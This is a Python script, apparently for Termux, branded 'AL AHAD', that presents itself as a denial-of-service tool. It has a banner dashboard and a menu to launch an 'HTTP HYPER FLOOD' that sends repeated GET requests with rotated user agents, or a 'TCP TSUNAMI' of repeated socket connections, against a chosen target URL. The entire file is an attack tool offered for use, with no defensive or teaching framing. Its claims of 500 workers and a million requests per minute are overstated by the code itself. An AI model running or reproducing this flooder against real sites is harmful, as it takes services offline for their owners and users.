#!/usr/bin/env python3
import os
import sys
import time
import random
import asyncio
import socket
import aiohttp
from datetime import datetime
from pyfiglet import Figlet
from colorama import Fore, Style

# ===== AL AHAD HYPER CONFIG =====
class AhadConfig:
    BANNER = """
    █████╗ ██╗      █████╗ ██╗  ██╗ █████╗ ██████╗ 
   ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗██╔══██╗
   ███████║██║     ██║  ██║███████║███████║██║  ██║
   ██╔══██║██║     ██║  ██║██╔══██║██╔══██║██║  ██║
   ██║  ██║███████╗╚█████╔╝██║  ██║██║  ██║██████╔╝
   ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
    """
    TARGETS = ["http://example.com"]  # Default target
    MAX_THREADS = 500  # Ultra mode for 1M+ RPM
    CONN_TIMEOUT = aiohttp.ClientTimeout(total=3)
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    ]

# ===== GLOBAL STATS =====
ahad_stats = {
    "status": "IDLE",
    "target": AhadConfig.TARGETS[0],
    "method": "",
    "requests": 0,
    "failed": 0,
    "rpm": 0,
    "start_time": "",
    "active_workers": 0
}

# ===== DASHBOARD UI =====
def display_dashboard():
    os.system('clear')
    f = Figlet(font='slant')
    print(Fore.RED + f.renderText('AL AHAD') + Style.RESET_ALL)
    print(Fore.CYAN + AhadConfig.BANNER + Style.RESET_ALL)
    
    # Status Panel
    print(Fore.YELLOW + "╔═════════════════ AHAD HYPER CONTROL ═════════════╗")
    print(f"║ Status: {ahad_stats['status'].ljust(10)} Target: {ahad_stats['target'][:25].ljust(25)}║")
    print(f"║ Method: {ahad_stats['method'].ljust(10)} Workers: {str(ahad_stats['active_workers']).ljust(6)} RPM: {str(ahad_stats['rpm']).ljust(10)}║")
    print("╠════════════════════════════════════════════════════╣")
    print(f"║ Requests: {ahad_stats['requests']} | Failed: {ahad_stats['failed']} ║")
    print("╚════════════════════════════════════════════════════╝" + Style.RESET_ALL)
    
    # Menu
    print(Fore.GREEN + "\n[1] HTTP HYPER FLOOD (1M+ RPM)")
    print("[2] TCP TSUNAMI (Raw Packets)")
    print("[3] STOP ATTACK")
    print("[0] EXIT" + Style.RESET_ALL)

# ===== HYPER ATTACK MODULES =====
async def http_hyper_flood():
    ahad_stats.update({
        "status": "ATTACKING",
        "method": "HTTP HYPER",
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "active_workers": AhadConfig.MAX_THREADS
    })
    
    last_count = 0
    async with aiohttp.ClientSession(timeout=AhadConfig.CONN_TIMEOUT) as session:
        while ahad_stats["status"] == "ATTACKING":
            try:
                headers = {'User-Agent': random.choice(AhadConfig.USER_AGENTS)}
                async with session.get(ahad_stats["target"], headers=headers) as resp:
                    ahad_stats["requests"] += 1
            except:
                ahad_stats["failed"] += 1
            
            # Calculate RPM every second
            if int(time.time()) % 2 == 0:
                ahad_stats["rpm"] = (ahad_stats["requests"] - last_count) * 30
                last_count = ahad_stats["requests"]

async def tcp_tsunami():
    ahad_stats.update({
        "status": "ATTACKING",
        "method": "TCP TSUNAMI",
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "active_workers": AhadConfig.MAX_THREADS
    })
    
    target_ip = socket.gethostbyname(ahad_stats["target"].split("//")[-1].split("/")[0])
    last_count = 0
    
    while ahad_stats["status"] == "ATTACKING":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, 80))
            s.close()
            ahad_stats["requests"] += 1
        except:
            ahad_stats["failed"] += 1
        
        # Calculate RPM
        if int(time.time()) % 2 == 0:
            ahad_stats["rpm"] = (ahad_stats["requests"] - last_count) * 30
            last_count = ahad_stats["requests"]

# ===== MAIN CONTROL =====
async def ahad_controller():
    attack_task = None
    
    while True:
        display_dashboard()
        choice = input(Fore.MAGENTA + "\n[AL AHAD] Select > " + Style.RESET_ALL)
        
        if choice == "1":  # HTTP Hyper Flood
            if attack_task: attack_task.cancel()
            attack_task = asyncio.create_task(http_hyper_flood())
            print(Fore.GREEN + "\n[+] HTTP HYPER FLOOD ACTIVATED! (1M+ RPM)" + Style.RESET_ALL)
            
        elif choice == "2":  # TCP Tsunami
            if attack_task: attack_task.cancel()
            attack_task = asyncio.create_task(tcp_tsunami())
            print(Fore.BLUE + "\n[+] TCP TSUNAMI LAUNCHED! (Raw Packet Storm)" + Style.RESET_ALL)
            
        elif choice == "3":  # Stop Attack
            if attack_task:
                attack_task.cancel()
                ahad_stats["status"] = "IDLE"
                print(Fore.RED + "\n[!] ATTACK STOPPED" + Style.RESET_ALL)
                
        elif choice == "0":  # Exit
            if attack_task: attack_task.cancel()
            print(Fore.RED + "\n[!] AL AHAD TERMINATED" + Style.RESET_ALL)
            break
        
        await asyncio.sleep(1)

# ===== RUN =====
if __name__ == "__main__":
    # Termux check
    if not os.path.exists("/data/data/com.termux/files/home"):
        print(Fore.RED + "[!] TERMUX ENVIRONMENT REQUIRED!" + Style.RESET_ALL)
        sys.exit()
    
    try:
        # Fix for Termux async issues
        if sys.platform == 'linux':
            import uvloop
            uvloop.install()
        
        print(Fore.GREEN + "[+] AL AHAD HYPER MODE LOADING..." + Style.RESET_ALL)
        asyncio.run(ahad_controller())
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] FORCE STOPPED" + Style.RESET_ALL)
